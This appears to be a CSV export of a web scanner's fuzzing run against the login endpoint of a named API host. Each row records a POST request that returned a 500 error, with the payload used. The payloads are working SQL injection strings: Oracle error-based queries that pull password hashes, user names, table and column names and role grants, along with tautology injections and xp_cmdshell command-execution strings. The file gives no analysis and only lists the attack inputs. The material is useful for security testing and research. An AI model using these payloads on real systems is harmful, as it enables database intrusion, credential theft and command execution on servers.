Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
847,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,286,633,124,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i, 23 or 1=1; --]"
850,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,243,633,130,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i, a' ]"
854,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,128,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i, ?]"
856,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,138,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i, ? or 1=1 --]"
857,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,633,152,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i, x' and userid is NULL; --]"
855,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,633,147,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i, ' and 1=0) union all]"
858,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,109,633,151,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i, x' and email is NULL; --]"
859,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,146,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i, anything' or 'x'='x]"
861,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,633,159,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i, x' and members.email is NULL; --]"
860,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,170,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i, x' and 1=(select count(*) from tabname); --]"
863,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,126,633,140,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i, 23 or 1=1; --]"
866,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,633,126,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, a' ]"
864,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,176,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
868,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,78,633,136,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, a' or 1=1; --]"
869,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,633,124,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, @]"
870,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,124,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, ?]"
871,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,633,143,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, ' and 1=0) union all]"
862,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,361,633,154,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i, x' or full_name like '%bob%]"
874,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,633,147,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, x' and email is NULL; --]"
872,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,633,134,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, ? or 1=1 --]"
873,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,633,148,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, x' and userid is NULL; --]"
876,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,166,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, x' and 1=(select count(*) from tabname); --]"
865,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,419,633,124,544,14,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, a]"
878,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,633,150,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, x' or full_name like '%bob%]"
877,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,633,155,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, x' and members.email is NULL; --]"
880,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,172,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
881,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,131,544,14,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, a]"
828,Fuzzed,Sat Jan 11 17:02:51 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,1453,633,151,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i, x' and 1=(select count(*) from tabname); --]"
883,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,135,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, a' --]"
884,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,633,143,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, a' or 1=1; --]"
885,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,633,131,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, @]"
879,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,352,633,136,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, 23 or 1=1; --]"
867,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,737,633,128,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, a' --]"
887,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,633,150,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, ' and 1=0) union all]"
888,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,141,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, ? or 1=1 --]"
889,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,155,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, x' and userid is NULL; --]"
890,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,154,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, x' and email is NULL; --]"
891,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,633,149,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, anything' or 'x'='x]"
882,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,443,633,133,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, a' ]"
893,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,633,162,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, x' and members.email is NULL; --]"
892,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,633,173,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, x' and 1=(select count(*) from tabname); --]"
897,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,633,137,544,14,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, a]"
895,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,143,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, 23 or 1=1; --]"
894,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,157,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, x' or full_name like '%bob%]"
896,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,633,179,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
898,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,633,139,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, a' ]"
899,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,633,141,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, a' --]"
886,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,422,633,131,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i, ?]"
901,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,137,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, @]"
902,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,633,137,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, ?]"
905,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,633,161,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, x' and userid is NULL; --]"
903,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,633,156,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, ' and 1=0) union all]"
904,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,147,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, ? or 1=1 --]"
908,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,633,179,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, x' and 1=(select count(*) from tabname); --]"
906,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,160,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, x' and email is NULL; --]"
875,Fuzzed,Sat Jan 11 17:02:52 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,946,633,142,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i, anything' or 'x'='x]"
907,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,633,155,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, anything' or 'x'='x]"
909,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,633,168,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, x' and members.email is NULL; --]"
910,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,633,163,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, x' or full_name like '%bob%]"
912,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,633,185,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
913,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,633,162,544,14,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, a]"
911,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,149,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, 23 or 1=1; --]"
917,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,633,162,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, @]"
914,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,127,633,164,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, a' ]"
915,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,633,166,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, a' --]"
916,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,174,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, a' or 1=1; --]"
918,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,94,633,162,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, ?]"
900,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,424,633,149,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i, a' or 1=1; --]"
921,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,73,633,186,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, x' and userid is NULL; --]"
919,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,633,181,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, ' and 1=0) union all]"
920,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,633,172,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, ? or 1=1 --]"
924,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,633,204,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, x' and 1=(select count(*) from tabname); --]"
922,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,633,185,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, x' and email is NULL; --]"
923,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,633,180,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, anything' or 'x'='x]"
925,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,633,193,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, x' and members.email is NULL; --]"
927,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,633,174,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, 23 or 1=1; --]"
929,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,633,185,544,14,,Reflected,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, a]"
928,Fuzzed,Sat Jan 11 17:02:53 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,633,210,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
930,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,633,187,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, a' ]"
931,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,189,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, a' --]"
932,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,197,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, a' or 1=1; --]"
933,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,185,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, @]"
936,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,633,195,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, ? or 1=1 --]"
937,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,209,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, x' and userid is NULL; --]"
938,Fuzzed,Sat Jan 11 17:02:54 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,633,208,544,14,,,"[' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i, x' and email is NULL; --]"
